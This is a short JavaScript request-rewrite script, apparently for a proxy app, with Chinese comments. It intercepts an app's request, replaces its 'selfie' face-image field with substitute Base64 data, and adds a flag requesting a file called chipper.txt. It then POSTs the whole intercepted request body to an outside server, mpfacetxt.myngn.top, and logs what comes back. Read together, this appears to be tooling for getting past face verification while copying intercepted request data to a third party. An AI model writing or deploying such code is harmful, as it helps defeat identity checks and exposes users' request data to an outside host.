let body = $request.body;

if (body) {
    try {
        // 尝试解析请求体为 JSON 对象
        var bodyObj = JSON.parse(body);

        // 你新的selfie Base64数据
        const newSelfie = "";

        // 替换selfie字段
        if (bodyObj.selfie) {
            bodyObj.selfie = newSelfie;
        }

        // 添加请求chipper.txt内容的字段
        bodyObj.request_chipper = true;

        // 发起请求
        const options = {
            url: "https://mpfacetxt.myngn.top/upload.php",
            body: JSON.stringify(bodyObj),
            headers: {
                "Content-Type": "application/json"
            },
            method: "POST"  // 确保这里是POST
        };

        $task.fetch(options).then(response => {
            if (response.statusCode === 200) {
                let respBody = JSON.parse(response.body);
                if (respBody.status === "success") {
                    // 获取chipper.txt内容
                    let chipperContent = respBody.file_content;
                    console.log("chipper.txt content:", chipperContent);

                    // 更新请求体或执行其他操作
                    body = JSON.stringify(bodyObj);
                } else {
                    console.log("Failed to get chipper.txt content:", respBody.message);
                }
            } else {
                console.log("Request failed with status:", response.statusCode);
            }

            // 返回修改后的请求体
            $done({ body });
        }).catch(error => {
            console.log("Request error:", error);
            $done({ body });
        });

    } catch (error) {
        // 解析 body 失败的情况下返回原始请求体
        console.log("JSON parsing error:", error);
        $done({ body });
    }
} else {
    // 如果 body 为空或未定义，直接返回原始请求体
    console.log("Request body is empty");
    $done({});
}
